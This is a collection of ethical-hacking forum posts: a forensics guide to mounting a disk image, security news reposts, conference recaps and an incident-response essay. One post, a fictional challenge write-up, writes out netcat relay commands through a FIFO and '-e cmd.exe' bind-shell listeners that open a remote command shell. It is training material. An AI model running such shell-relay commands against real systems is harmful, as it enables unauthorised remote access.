of the partitions that was on the suspected drive.  from the target machine type      code: fdisk -ul hard-drive-image   which should list the partitions with sectors instead of cylinders.  each cylinder is 512 bytes.  so if your first partion starts at sector 63, like mine does, then you need to multiply 512 bytes by 63 sectors.  that means that the first partition starts 32,256 bytes into the file.  now we can mount that partition      code: sudo mkdir /mnt/suspect sudo mount -o loop,offset=32256 hard-drive-image /mnt/suspect cd /mnt/suspect ls voila, youre now looking at the contents of the suspect hard drive, and you havent made any changes to the drive itself, and since you saved the hash value you can prove that the original hard drive has not been altered in any way
3;Skillz Dec 06 Winning Entry - Creativeike tremoulet a little more... a little more... i had it all!  i finally had all of little ophcrack annies code.  i read back what i had decoded: drink more oval tine buy counter hack reloade use net cat relay i couldnt believe my eyes.  all this time, i had waited for a crummy advertisement for ovaltine?!  i mean, everybody wanted a copy of that book, but it turned out to be an advertisement?  this wasnt helping me get my red rider at all. then i started to think about the last part of annies message. something was bugging me about it.  i thought about it, pulled out my calculator, and punched in a few numbers.  then i scribbled out the eighth line, and wrote down: e414a2208c930d79 4a3b108f3fa6cb6d "there," i thought, "much better!" and turned back to the problem at hand.  how to get at that mystery list?  annie had given one more clue in her message about netcat relays.  hmm...  ah ha!  i knew that the nc executable on the lamp was netcat - dad loved to use that for everything he could.  and the chimney file had a p in the description; that meant that it was a fifo pipe ready for use as a relay!  my old man must be using the lamp to hide things from mom, to have left things like that out in the open.  or had randy been trying the same trick as i was? i thought for a minute, and started a netcat listener on my laptop.  i decided to use port 80; if i was lucky, dad would just think it was normal browser traffic. nc -l -p 80 then i sent the following command to the lamp: nc 10.11.11.11 80 0<chimney | nc 10.10.10.10 2222 1>chimney and to my amazement, i got a command shell on the furnace!  quickly, i told it to "type c:\christmas_gift_list.txt" as quickly as my ten-year-old fingers could type.  there it was!  the old man had come through after all! then it hit me.  the old man!  surely hed find out about this!  and i uttered those words that no ten-year-old should ever utter at home - "oh, sh--" "ralphie!!!!"  my mothers voice rang out. "ralphie, you get out here this instant!  where did you learn this language?!"  i slammed my laptop shut so mom wouldnt see, and hurried out into the hall.  "ralphie, come here.  you need your mouth washed out.  dont you ever let me hear you use that kind of language again!"  and, with that, she pulled out the morton anti-viral soap from the bathroom cabinet and shoved it in my mouth. once she let me go, i ran back to my laptop.  how could i have been so stupid!  as soon as i dropped the connection, dads netcat listener would stop and hed know for sure that i had been there!  what to do, what to do....  it was a windows server; i could schedule a task to restart the listener, but that would leave an entry in the logfile that just might tip my hand.  working quickly, i decided that i could start up a new session and restart the original one.  fortunately, i hadnt lost my connection to the furnace while eating the soap earlier.  i gave it this command: start c:c.exe -l -p 3333 -e cmd.exe and exited out of the shell.  i restarted the listener on my laptop, and sent the email back to the lamp (changing port 2222 to port 3333), and silently cheered as i saw the command shell again.  almost there! i fed in the last command to restart the listener: start c:c.exe -l -p 2222 -e cmd.exe and breathed a huge sigh of relief.  it looks like i had gotten away with it!  dad would be able to see the connection if he checked now, but the odds of that were slim.  still, i had to create some sort of diversion.  what to do, what to do....  the old man did love his turkey, thats for sure.  i was counting on that as i connected to skodos ftp site, pulled down a special dll that he had told me about, and ran the dll injection program to inject turkey scents into the furnace output.  the smell of turkey ought to keep the old man occupied for a while. i could smell the turkey scent wafting through the house now.  and then, i heard the neighbors dogs charge in downstairs.  oh, no, what had i done?!  i was in for it now.... congrats and well done, do
3;Malware Incident Responserecently posted ( http://www.cutawaysecurity.com/blog/archives/80 ) this to my blog and i was interested in some feedback from this forum. when to initiate malware incident response when somebody tells you that their anti-virus software detected a virus do you start your incident response procedures?  if you do not you should reconsider your position.  "but, cutaway, if i initiated my incident response plan everytime a virus was detected i wouldnt get anything else done!"  i really hope that you do not work in an environment where systems are being infected on a daily basis.  but if you do, and they are, then perhaps you should consider implementing your incident response procedures everytime.  please allow me to explain. most virus/worm reports are going to come in through your helpdesk or by a quick call to the responsible administrator.  the first step in your incident response plan should be to identify the assets that are involved.  im not just talking about the physical assets.  for instance, the infected system was an end-users workstation.  i am also speaking about the other assets that are involved with the infected system.  does the end-user work with sensitive information?  is the system on the same network segment as the database server that contains the database with credit card information?  by quickly determining the type of assets involved the point of contact can choose to continue following the incident response plan and escalate the situation or log and mark the system for review and maintenance.  without this situation analysis you might not know the full extent of the issue. now that the situation has been identified a course of action can be determined, whether through the incident reponse plan or the maintenance procedures.  do we need to pull the system from the network?  do we need to get a copy of the malware so that it can be analyzed to determine its function and purpose?  do we have to identify if sensitive information was accessed or exposed?  how did the system get infected in the first place?  can the system be cleaned sufficiently to perform its function or does it need to be wiped and redeployed? all of these are standard questions and easy for anybody to pick up on.  from the list i really want to focus on the "how did the system get infected" question.  if you dont have to initiate an incident response plan this question has the biggest potential to get overlooked.  it is easy to say, "i got infected but the anti-virus detected and deleted the malware for me.  im good, ive got work to do, im moving on."  a common business continuity, attitude but what got solved here?  the system is not infected anymore but it is still vulnerable to the same incident.  by initiating the incident response plan you are ensuring that this question will be asked and sufficiently answered.  now, you have to be careful here because it is very easy to get sucked into a tunnel vision approach and miss the gaping hole in the side of the ship.  viruses, worms, and malware dont just magically generate on a system.  there are any number of ways they can find a home: user interaction, worm prorogation, web surfing and email reading, exploited applications and services.  when you look at that list can you see the potential that one avenue of approach might be mistaken for another.  let me put it this way, if your anti-virus detected a worm on your system whose method of propagating includes exploiting dcom or some other service can you say for certain that the worm was not placed on the system by a person who exploited a different vulnerable service and then uploaded this worm because their network reconnaissance of your network showed that more systems were vulnerable to the detected worm?  you might have to read that sentence again to get my point but it is there.  until you look into and address all the methods a system could have been compromised then you are still vulnerable and the system will get owned again, and again, and again. okay, we have identified our assets we have determined how the system is vulnerable, are you satisfied?  actually, that is my question to you.  if you were following your incident response plan would you be satisfied at this point.  where is the follow up?  what was assigned with this task?  did their manager or the incident response team leader follow up with them?  the process is not complete until the all of the issues have been resolved, the administration of the system has been reviewed, and procedures have been modified to increase the prevention related to malware infection on this and other systems in the organization.  yes, i do understand that implementing your incident response plan is going to cost you in man-hours and money that could be spent elsewhere.  this is exactly my point.  by devoting man-hours and money to this type of activity people (managers) are going to start to take notice.   if they dont notice then you need to be pointing it out to them.  at the same time you should present them with options as to how new procedures, updated policies, end-user training, system hardening, and other security modifications can reduce the number of incidents and thereby decrease the amount of man-hours/money devoted to responding to these types of incidents. sure, what i have described here is a very simplistic example of an incident response plan.  but the point of this exercise was to help you understand that just allowing your anti-virus software to act as your final step in the malware security aspect of your defense will only ensure the continued infection of your systems.  this will eventually lead to bigger and badder compromises in the future.  protect yourself now by being proactive and not allowing yourself and others to take the easy way out. update:  when i got up this morning i realized that i forgot to mention one important fact.  the primary reason behind an incident response plan is not the security of the assets involved.  rather, it is the business continuity of these assets.  the job of a security professional is not to firefight potential issues but to evaluate the threats associated with the companies assets and mitigate them as much as possible to ensure the business continuity of the organization.  by not initiating your incident response plan to help you combat malware within your environment you are, in effect, placing your assets at greater risk. please, if i have missed something point it out to me in a comment or trackback a blog posting from your site.  i welcome the feedback and critiques as they help me grow and become a better security professional. go forth and do good things, cutaway  thanks, go forth and do good things, cutawa
2;Super Bowl Stadium Site Hacked, Seeded with Exploitsf youve ever read ryan naraines stuff, you knows it always a good read. this is no different: the official web site of dolphin stadium, home of sunday’s super bowl xli, has been hacked and seeded with exploit code targeting two known windows security flaws. in the attack, which was discovered by malware hunters at websense security labs, the server hosting the site was breached and a link to a malicious javascript file was inserted into the header of the front page of the site. visitors to the site execute the script, which attempts to exploit the vulnerabilities. according to dan hubbard, senior director, security and technology research at websense, the malicious site hosting the script has been taken offline by law enforcement officials but the hacked dolphin stadium site — which is attracting a lot of super bowl-related traffic — is still hosting the malicious javascript. a visitor to the site with an unpatched windows machine will connect to a remote server registered to a nameserver in china and download a trojan keylogger/backdoor that gives the attacker “full access to the compromised computer,” hubbard said. sources tracking the threat say the the hosted malware’s server host’s ip address address keeps changing. this means that unless the owner of the hacked site removes the malicious .js code and secure their server, exploits could start hitting unpatched visitors again. the attackers are exploiting flaws patched in microsoft’s ms06-014 and ms07-004 bulletins. [updated: february 2, 2007 @ 2:42 pm]  the dolphinstadium.com web site has been cleaned but new information suggests another variation of the domain, which redirects to the main site, has now been compromised and actively serving the exploits. “we’re not out of the woods yet. this is real-time and on-going,” a source said. websense has posted an  advisory  with screenshots. the most important thing right now is to make sure your windows machine is fully patched. users can download and install the updates from microsoft update or the built-in automatic updates mechanism. for original story: http://blogs.zdnet.com/security/?p=15 do
2;Wireless Hacking Tool Makes Splash at RSAmong the most intriguing technologies being shown off at this years ongoing rsa conference in san francisco is a mobile penetration testing application made by miami beach, fla.-based immunity that allows people to scan networks for vulnerabilities on the go.  dubbed  silica , the sleek handheld, based on a nokia tablet device, claims the ability to test wireless network security using wi-fi technology—with other form factors and support for bluetooth and wired ethernet connectivity planned for delivery by immunity soon.  the handheld is specifically being pitched by the 10-employee firm, founded in 2002, as a method for people to search for unprotected access points without drawing attention to their efforts. users can casually stroll around any office building and simply scan the airwaves for network access "while behaving innocuously," said justine aitel, chief executive of immunity.  the application is built around a linux operating system and is based on the firms more robust canvas product line of penetration testing software. it features three simple functions—scan, stop and upgrade—making it the perfect choice for people seeking carefree mobile hacking capabilities, according to the vendor. aitel, a former chief security officer with business news outlet bloomberg, said immunity has received a fair number of orders for the devices over the last few days at rsa.  "were always trying to reach different markets, and an increasingly sophisticated user base has been asking us for something like this that is simple to use and move around with," aitel said. "its also a way for us to reach out to slightly different groups of customers than in the past, and a different crowd than we typically cater to with canvas." the former cio cooked up the idea for the mobile hacking device while at bloomberg, where she was constantly worried about the use of rogue access points and unprotected wireless networking systems. whether being used to carry out man-in-the-middle attacks against unguarded wireless users or to seek out file shares sitting on peoples desktops, the device is a convenient platform for proving the need for stronger access protection, according to the executive. "people can ship this to their operations anywhere in the world to help test the vulnerability of their corporate networks," the ceo said. "we think theres a real market for this type of device."  for original story: http://securitywatch.eweek.com/vulnerab ... t_rsa.html do
3;How Does The Hacker Economy Work?lthough i wish they would not use the word hacker, and instead use cracker... or maybe more appropriately use criminal... nonetheless, here is an interesting article on the ever evolving cracker economy. its a murky world of chat rooms, malware factories, and sophisticated phishing schemes. heres a look inside. when retailer tjx disclosed jan. 17 that the computer systems that store data related to credit card, debit card, check, and merchandise return transactions had been broken into, it said it had discovered the hack in december. but security officials at visa had been seeing an increase in fraudulent activity on credit and debit cards related to tjx properties, such as t.j. maxx, marshalls, and homegoods stores, since mid-november. that means its possible the purloined consumer data has been floating around the internet, available for purchase on black market web sites and chat rooms, for at least two months, maybe longer. hacking isnt a kids game anymore. its big business. online black markets are flush with stolen credit card data, drivers license numbers, and malware, the programs that let hackers exploit the security weaknesses of commercial software. cybercriminals have become an organized bunch; they use peer-to-peer payment systems just like theyre buying and selling on ebay, and theyre not afraid to work together. while the independent hacker still exists (pardon us, but in this story, well refer to "hacker" in the laymans sense), the fbi sees true organized crime in parts of the hacking community, particularly in eastern europe, says special agent chris stangl, who works in the bureaus cybercrime division, the agencys third largest behind counter-terrorism and intelligence. "youll have hackers cracking the machines, individuals collecting the data, and individuals selling for profit," stangl says. getting a clear picture of the hacker economy isnt easy. its a murky underground about which few people are willing to talk on the record. but the general outlines can be gleaned from inside and outside sources. direct approach some hackers take the direct approach. ransom scams--in which a criminal infects a companys systems with malware that encrypts data and then demands money to provide the decryption key--are common in russia. uriel maimon, a researcher with the consumer division of rsa, a security vendor now owned by emc, says hes seen a half-dozen of these scams over the past five months. but in the scheme of things, those kinds of scams arent all that common because theyre risky--they require "a direct financial connection between the victim and the author or proprietor of the malware," says david dagon, a researcher with the georgia tech information security center. more omnipresent is the thriving black market in data. online sites abound where credit and debit card numbers, cardholder names, and the card verification value, a three- or four-digit code thats used to verify a cards authenticity, can be bought and sold. jeff moss, who goes by the handle "the dark tangent" and is the founder of black hat, a security research and training firm (owned by informationweek parent cmp), says he knows of one european cyberattacker who makes nearly a half-million dollars annually buying and selling databases and customer lists. for full article: http://www.informationweek.com/showarti ... =197004939 do
2;Drive-By Pharming Hits Home Routersew drive-by attack taking over home routers by sharon gaudin, 06:39 pm et, feb 15, 2007  researchers at symantec are warning users that if they havent changed the default password on their home wireless router, they should finally just do it. symantecs zulfikar ramzan issued a warning thursday that hackers are lacing phony web sites with malicious code that actually will log into and mess with your home broadband router. hes coined a term for it: drive-by pharming. "i believe this attack has serious widespread implications and affects many millions of users worldwide," wrote ramzan in his blog on symantecs security response weblog thursday morning. "fortunately, this attack is easy to defend against, as well." now, heres the thing. how long have security types been telling us to be smart about our passwords, whether the passwords are for our laptops, our smartphones, or our home routers? its not a new call to arms. but, obviously, its one we all need to hear again. heres how ramzan, and his fellow researchers, sid stamm and markus jakobsson of the indiana university school of informatics, say the new problem goes: attackers build a fraudulent web page that, simply when viewed, results in substantive configuration changes to your home broadband router or wireless access point. they add malicious javascript code to the page. "when the web page is viewed, this code, running in the context of your web browser, uses a technique known as cross site request forgery and logs into your local home broadband router," explains ramzan. "now, most such routers require a password for logging in. however, most people never change this password from the original factory default. upon successful login, the javascript code changes the routers settings. one simple, but devastating, change is to the users dns server settings." once they mess with your router, the attackers have control over it, allowing them to direct you and your browser to whatever web sites they choose. you may want to go to, say, hack in the box but, instead, youll go to whatever site they want to send you to. (for more technical details about the attack, check out ramzans blog.) think about it. that could be bad. if you have kids using your home computer, do you suddenly want a hacker in charge of what web site theyre going to? it also can be dangerous. you could be surreptitiously diverted to another fraudulent web site where you might divulge personal financial information, be infected by another round of trojans, or unknowingly hand out critical company information. so, its another reminder to be smart about our passwords. i, myself, could be smarter about them. im trying but i still need to be better. ramzans warning serves as a good lesson about a new kind of attack, and a good reminder. original story: http://www.informationweek.com/blog/mai ... y_att.html do
2;Hactivism - Good or bad?he article below entitled "vigilante hackers evidence puts judge behind bars," made me think about where our readers stand on hactivism. share your thoughts. a so-called hacktivists trojan program that allowed him to infiltrate the judges computer and find evidence of child pornography possession raises legal and ethical questions for some.   by sharon gaudin  informationweek  feb 23, 2007 01:32 pm  a former california judge was sentenced this week for possession of child pornography, six years after a vigilante hacker infiltrated his computer with a trojan horse computer program designed to weed out pedophiles.  former orange county superior court judge ronald c. kline, 65, of irvine, calif., was sentenced feb. 20 to 27 months in federal prison for possessing thousands of images of under-age boys engaged in sexually explicit conduct. he pleaded guilty in december 2005 to four counts of possession of child pornography, admitting that the images of child pornography were on his home computer, two floppy disks, and one portable disk drive, according to a written release from the u.s. attorneys office in the central district of california.  the sentencing wrapped up nearly six years of legal wrangling over the admissibility of evidence obtained from klines computer.  brad willman, a canadian known in hacker circles as citizen tipster, wrote the trojan and embedded it in images of child pornography. he then planted the images on newsgroup sites frequented by pedophiles. once users downloaded the images, their computers would be infected by the trojan and willman would have access to their machines so he could root around in them, looking for other child pornography or even molestation evidence.  willman has not been charged for the computer break-ins or for writing and distributing the malware.  the vigilante hacker found other images of child pornography on klines computer, along with a personal diary recounting his "sexual interest" in young boys, according to assistant u.s. attorney greg staples, who worked on the case. kline, who was a judge from 1995 to 2003, also was a little league umpire in the town he lived in.  staples says willman passed the information on to a group that tracks pedophiles, and the information eventually made its way to california authorities, who began an investigation.  "we wouldnt have known about this without him," says staples, who adds that a search of klines home revealed 1,500 images and 24 videos of child pornography. "it began the investigation ... he fancied himself a predator hunter." staples also says a search of klines judicial chambers found he used his court computer to visit pedophile sites, as well.  the ethical difficulties with the investigation, which in itself was illegal, led to complications for the prosecution. the federal case took a major setback when u.s. district court judge consuelo marshall ruled in 2003 that the evidence willman found on klines computer amounted to an illegal seizure, saying the man, who called himself a "hacktivist," was acting as an agent for law enforcement.  the ninth circuit court of appeals overruled that decision in 2004. the case never went to trial because kline pleaded guilty in december 2005.  staples says it was easy enough to prove that willman had not been acting as an agent for the police because it took them upwards of six months just to track him down to verify his identity and what he found on klines computer. "the key issue, as far as this case goes, is whether the government had knowledge of what this person was doing," he adds. "clearly, we did not. he did his search six months or more before we even knew who he was." the question now is whether this case will spur more would-be vigilante hackers to take up arms against any number of groups or causes. while the prosecutor claims the state wouldnt have had a case against kline without willmans help, virus writing and accessing someone elses computer is a legal minefield. and if the malware or intrusion had caused more than $5,000 in damages to the computer, the hacktivist could have been facing federal charges.  "you dont want vigilante amateurs getting involved in this," says graham cluley, senior technology consultant for sophos. "they are breaking the law. ... the danger here is taking the law into your own hands."  keith jones, a senior partner with maryland-based jones, rose, dykstra & associates, a digital forensics company, says infecting machines with malware could damage evidence that law enforcement will need to make the case. it also could give the defense something to argue during court.  "a case without a trojan is going to be a heck of a lot easier to prove," says jones, who has done forensic investigations on more than 100 cases, including the ubs painewebber case last year. "if theres a trojan on there, youre no longer examining a computer that only the owner has been able to touch. now you have the added job of figuring out if this picture was downloaded by the person physically controlling the keyboard or by the person controlling the trojan. ... it lets the defense argue that someone else had the ability to do it."  assistant u.s. attorney elena duarte did not work on the kline case but as chief of the cyber and intellectual property crimes section for the los angeles office, she warns would-be hacktivists that no matter the cause, hacking is still against the law.  "i would caution folks who think that just because theres a moral justification it makes it all right to violate any laws," she says. "computer intrusion statues dont provide for a justification if you have a good motive. its not a good thing and it certainly should be discouraged. ... it puts them in a position of a potential target for prosecution."  duarte says anyone thinking of working as a vigilante should make sure they know the law, and consider if they want to run the risk of being criminally prosecuted.  "its always good to see criminals brought to justice but the means of doing that are just as important," says duarte. "if the means are not appropriate, then we certainly dont encourage them." original story: http://www.informationweek.com/security ... =197008431 do
0;Shmoocon Day1on was nice enough to sponsor me to go to shmoocon for eh-net. site:  http://www.shmoocon.org/ so here is my wrap up for day 1: this is the 3rd year of shmoocon and started off very well. we started with bruce potter giving the crowd a warm up to the days speakers and a bit of history about the con and another bit about how the ticket sales went.  in case you dont know, the first batch sold out in about 3 days, the second batch in 45 minutes and the last batch in 8 minutes.  of course there i was trying to buy my ticket in that last batch and didnt make it in the first 8 minutes  >:(.  thankfully don came to the rescue. here is the speakers schedule: http://www.shmoocon.org/schedule.html todays talks were 20 minute talks with 10 minutes q&a. h1kari hacking the airwaves with fpgas: *this talk was about some advancements & research in wpa & wep cracking drastically speeding up cracking time using fpgas.  he did a couple of demos and was cracking wep and wpa with cowpatty on windows and was on the order of 4 times faster with fpga than without.  he also talked about some flaws in os x filevault and being able to crack the hashes with john the ripper.  he also did a demo cracking bluetooth pins, again considerably faster with the fpga than without.  i was really wanting to go out and purchase one until he dropped the $1900.00 pricetag for one.   eoin miller and adair collins auditing cached credentials with cachedump: *this talk was about using the cachedump tool during assessment to pull down the cached administrator credentials that can be left over when a domain admin logs in to a windows box for maintenance.  they discussed that these creds can be cached when  the admin logs in locally, remotely with rdp, using the "run as" command, logging in with dameware or if admins share a laptop with other users. they had a group policy script (dont know if they are releasing it) that would go thru using cachedump look for cached admin creds and delete the key out of the registry which should pretty much mitigate the attack. adam shostack security breaches are good for you: *this talk was about how security breaches should be good for us (as the consumer).  he talked about tjmax and choicepoint data losses/breaches and how you would have thought that these companies would have lost major $$ and customers but it didnt seem to go that way.  fairly interesting discussion.  the major obstacles to this research seems to be the lack of reporting by companies of losses or breaches or personal data even though most states require it by law. johnny long no-tech hacking *excellent talk on really just observing things around you from a hackers perspective.  like what people are wearing at the airport letting you know what they do for a living, security badges, dod stickers on cars telling alot about the person driving, and how shoulder surfing at the airport or on a plane is still a very real threat.  he also had another good piece on how valuable dumpster diving still is.  really good talk considering it had nothing to with computers per say but still putting those hacker mind skills to work. deviant ollam, noid and thorn boomstick-fu: the fundamentals of physical security at its most basic level: *this talk was about firearms. handguns versus rifles vs shotguns.  good q&a with some ex law enforcement people. sergey bratus simple entropy-based heuristics for log and traffic analysis: *when the talk starts out with the guy explaining entropy and log and traffic analysis to all the people in the crowd you know you are in for some good con-fu and it was good.  check out his speaker bio for more info: http://www.shmoocon.org/speakers.html keynote address: aviel rubin: *great talk on breaking into systems; political, legal, & technical aspects.  covered responsible disclosure and the law, how/when to involve lawyers, dmca issues, and creating adversaries out of the the companies whose software you broke into little pieces :-)   also good points on making sure you inform management of what you found so they can line up their lawyers for damage control if the company decides to play rough.  dr. rubin talked about his research into the diebold voting machines and cracking the rfid (exxon/mobil speedpass) as well as some of the car keys that use similar technology to verify that your key is paired with your car. his slides are already posted on his blog, so check them out: http://avi-rubin.blogspot.com/ other things of note were: t-shirts were 10 bucks!   got to meet ed skoudis, that was cool! crowd was good, location was good, and atmosphere was good too
3;Shmoocon Day 2k, first word that comes to mind is inspiring.  i cant wait to get home and really dig into some ideas that i have and hopefully break stuff.  maybe its exciting in academia when people present papers on new and interesting research but i dont think that beats seeing the first public demo of some new 0wnage technique that will be getting talked about for the next few weeks, maybe but i doubt it. i have decided that i think the people that talk at these cons continue to do such great work because they talk at these cons.  i am sure there are some other factors like drive, determination and just being really really smart but being around the tons and tons of great minds and the great atmosphere at most of the cons really inspires me (and i am sure others) to continue to research or just to work on your fu. if you havent gone to a security con, i highly recommend going even if you have to go alone because you always meet new people who are (generally) like-minded.  how many parties can you go to as a security or computer dude and have pretty much everyone at the party be interested in what you are interested in?  its great stuff.  tonight (after the talks) people were splitting their time between hack or halo and the hack challenge that applied security had set up and plenty of booze and mingling.  i unfortunately am packing because  i have a plane to catch...yeah big    face. even the smaller cons will give you a sense of the atmosphere and should inspire you to really keep doing what you are doing and trying to learn everything you can.  again, its something, as a security professional (or striving security professionals) you can do for growth as well as networking. last thought before i get into the talks i went to, is that this con reinforced my belief that you need to be able to code to be a good innovative security professional.  ill probably start the code or not to code war again but all the people really giving great talks on attacks relied on their coding skills to pull together their concepts into working attacks or at a minimum you would need to code or alter some code to get an attack to work.  so if you are wondering if you should devote some study time to learning some sort of programming language the answer is yes.  what language, well who knows... that can really be a debate.   ok on with the talks... the metro got me to the con a bit late so i couldnt even squeeze into simple nomads talk so i sat in on ofir arkinss bypassing nac systems (part 2).  he had given some talks on the subject previously so he just talked more about it  pretty good but i only caught the end of it.  i did see him speak at blackhat and defcon years ago on xprobe and i remember them being really good talks his nac one seemed like it was good and people talking outside after seemed to think it was good. matt fisher, cygnus and presmike web application incident preparation: *great talk on the differences between traditional incident response and web application incident response.  huge issues arise because typically there isnt anything left on the victim box to analyze. you are usually stuck with just log files and have to determine if any data egressed your network or site and to what extent and what type of data that was.  they discussed the different types of logging and what to log for your web apps; web server logs, sql logs, os logs, the application logs, etc.  they also went over things to do to try to help tune your ids to catch web app attacks like creating a dummy database whose data should never be traveling across the network unless someone is dumping you whole database in an attack.  really good talk. all three of the talks after lunch looked good but i went with billy hoffman javascript malware for a grey goo tomorrow: *billy hoffman works for spidynamics  http://www.spidynamics.com/  and those guys are cranking out great research in the web app field.  he talked about some of the nasty things you can do with javascript and ajax.  big topics were using jikto and xss to hop hosts with your attacks (something that previously wasnt possible)  really great info.  next talk was michael schearer the church of wifi presents: a hacker in iraq: *decent talk about a navy ew  guys time in iraq.  mostly dealt with ieds and what we are doing to address the threat in iraq next talk presmike and cygnus targeted network attacks: *good talk on how an attacker who wanted to target an organization would go about doing it.  good stuff on targeting users, getting malware into the organization, and methods for allowing the desired information out of the network and back to the attacker.  started a bit slow and a bunch of people left but ended up being really good. next... dan kaminsky weaponizing noam chomsky, or hacking with pattern languages *ok if dan kaminsky is talking you have to listen and most of the con crammed into the smallest room to listen and it was worth it even if it wasnt about dns     last talk i attended chris paget wpad: proxy attack * wpad is web proxy auto disocvery protocol ( http://en.wikipedia.org/wiki/web_proxy_ ... y_protocol )  basically with wpad is that ms browsers if you have the automatically detect proxy settings the browser will send a request  for a wpad file which is basically the proxy list, normally this would be ok if you run everything on your network thru a proxy but if you dont this could be an issue because if the attack works, now everything on your network is now going thru a proxy that you dont control :-( he discussed attack vectors and fixes.  gave some great demos using a wpad tool that he wrote that will track which ips are looking for the wpad file after you send the attack and he also demoed a hack proxy tool that would act as the man in the middle and did some really wicked stuff like forging ssl certs, forcing the browser to authenticate in plain text or forcing the browser to authenticate with ntlmv1 which can be cracked...whoo hoo.  supposedly releasing the wpad tool but not the hackproxy tool on the ioactive.com site. well thats it, hopefully people got something out of the recap.  a little more info can be found on the speak bios: http://www.shmoocon.org/speakers.html & shmoocon says they will be posting the presentations and video at some point so it should be worth your time to go back and check it out. thanks again to don for sending me and if anyone is planning on going next year, buy your tickets early

1;Internet Storm Centeror anyone not familiar, internet storm center (isc) is a great way to keep track of the current condition of the internet.  each day a different administrator is assigned to keep diary entries.  these entries vary from current attack vectors, to discussions of critical patches for various os and applications.  the isc also contains a list of the top 10 ports being attacked and a world map depicting attack trends.   the isc is a resource that helps to paint a picture of what is going on in the cloud, the problem is that most of us have 20 tasks to complete, and even the two minutes needed to browse the site it too much to spare.  luckily (and if you are running windows), tom liston of intelguardians, wrote an application that sits in the system tray  http://handlers.sans.org/tliston/iscalert.zip . simply download the .zip file, and double click the .exe.  if you have an environment which restricts executables, simply copy the .exe into c:\documents and settings\uuser\start menu\programs\startup.  in the system tray you will see a small icon of the world, which hopefully will be green, this indicates that everything is normal.  as the threat level increases, the color of the icon changes; for a complete breakdown of each threat level and the color which represents the threat see  http://isc.sans.org/infocon.htm
2;IPv6: Ready or Nothere are very few things you can bank on in this world. its even harder to set a career or educational path based on new technology that may or may not catch on with the masses. this is not the case for ipv6. imagine a job interview where someone asks about getting them in compliance with the us government ipv6 mandate in a little over a year (june 2008). what will your answer be? let this be your wake-up call. if you havent already... learn ipv6 now. with the security implications to the globe, if you have this knowledge under your belt sooner rather than later, it can do nothing but catapult your career. dont say i didnt warn you! check out this article by eweeks lisa vaas. by  lisa vaas   may 4, 2007 way to go, vendors of low-end routers and intrusion detection and prevention systems—youre a stumbling block on bechtels path to the next-generation internet. "were doing [both ipv4 and the next-generation ipv6 networks], and we anticipate doing both for a number of years," said fred wettling, a bechtel fellow who manages technology standards and is sponsoring the enterprise ipv6 challenge within bechtel. "this creates a challenge from the security standpoint of making sure the security mechanisms will do tracking [and] protection on both v4 and v6 concurrently."  the problem, he said, is that "some people making security products are not quite there yet," with "there" meaning product support of native ipv6 connectivity. "thats kind of frustrating."  why does bechtel want ipv6? imagine the company rapidly deploying employees to new orleans in the wake of hurricane katrina, which the construction outfit in fact did. with the vast ip addressing space ipv6 has ushered in—its main draw—and its ability to turn every notebook, cell phone or other ip-enabled gadget into a server on the peer-to-peer network that ipv6s endpoint-to-endpoint architecture enables, post-katrina recovery would have been markedly different. for example, trailers could have been connected to each other dynamically once the ip cloud was established, with no work required from bechtels it people.  its not pie in the sky. ipv6 is here, now. europe and asia are roughly tied in the total number of ipv6 addresses they have per capita, said wettling, based in oak ridge, tenn., and a member of the north american ipv6 task force and executive director of the ipv6 business council. also, the u.s. governments office of management and budget has mandated that the federal government—including agencies and contractors—transition by june 2008.  perhaps most notably for north american enterprises that havent yet dabbled in ipv6, microsoft is serving up the technology in windows vista and "longhorn," with a protocol to tunnel ipv6 traffic over ipv4—a transition technology to compensate for security and network perimeter device vendors lag time in supporting the new protocol.  ipv6 is now here, and so are its security issues. it is a nightmare scenario for any security officer, according to multiple sources, including charles lee, chief technology officer for verizon federal—the group within verizon business dedicated to serving federal government customers.  "i think that the tipping point has been reached," said lee in washington. "what i point to as the killer app is voip [voice over ip]. there are huge market forces around untethered voice service: pda-enabled cell phones and so on. untethered assets are a real market force. in order for those applications to behave well and work in a broad environment, they need v6 capability. v6 is here. the cell phone folks have already set up address allocations: nokia reserved 500,000 addresses for itself, [and the] chips have been introduced [that] will enable the next generation of services."   in other words, consumers are either using it now or will use it in the next 12 to 18 months, lee said. what that will look like to your network is this, he said: "you can do p2p so much easier. instead of me having to directly access some central repository, i may be able to send information from my cell phone to yours, bypassing any other tracking or storage device in the middle of the network, and thereby have complete security in the course of moving this information."  yes, ipv6 brings security—or obfuscation, as the case may be—to moving information. one notable feature of ipv6 is that it puts encryption into the hands of the user. were an ipv6 user to illicitly collect data, he or she could pass it off, without network perimeter security checks able to look inside its encrypted contents, to another peer on ipv6—an accomplice who could be anywhere. "and youve just laid out the nightmare scenario for any security officer," lee said.  the industry already is facing those challenges, lee said. "its not uncommon for security people to be very concerned with data integrity and keeping proprietary data under lock and key, and often we miss the fact that the guy who just walked in has a camera in his cell phone," he said. the security challenges p2p presents exist today, but theyll be more obvious when ipv6 walks through your enterprises door, lee said, because "new generations of capabilities will be sitting on peoples hips."  tunneling is another security implication. symantec in november first brought up the security implications of microsofts vista and the upcoming longhorn server using the teredo protocol for tunneling ipv6 over ipv4 networks. again, the potential security implications of teredo concern the inability of perimeter devices to see inside packets. idses (intrusion detection systems) are generally good at inspecting tcp and udp (user datagram protocol) traffic, which are the traditional protocols that transport web and e-mail requests. if attacks on a system are tunneled, however, theyll be invisible to idses. for full story: http://www.eweek.com/article2/0,1895,2126069,00.asp do
3;Code Wars: America’s Cyber Threathis cnbc original documentary was first broadcast on may 26, 2011. broadcast again on 10-30, i dvred it. trying to get time this weekend to give it a look. thought id share. in the united states, we are internet dependent. our financial systems, power grids, telecommunications, water supplies, flight controls and military communications are all online – making them vulnerable to countless attacks by cyber criminals. the goal could be a 10-minute blackout, an attack on our national security, a stock trading glitch or the theft of millions of dollars worth of intellectual property. the fbi has recently made cyber crime a number one priority, one that costs the u.s. an estimated trillion dollars a year. cnbc’s "code wars", hosted by melissa lee, takes you onto the frontlines of the war on cyber. cyber attacks are almost impossible to trace, making cyber crime and acts of cyber warfare the ultimate anonymous crime. so how do we protect our systems whose components are largely manufactured abroad? can our nations infrastructure be protected from cyber attacks? and how can the u.s. win a war in which conventional rules of combat do not apply? cnbc tackles the tough questions in "code wars: america’s cyber threat." http://www.cnbc.com/id/42210831/ do

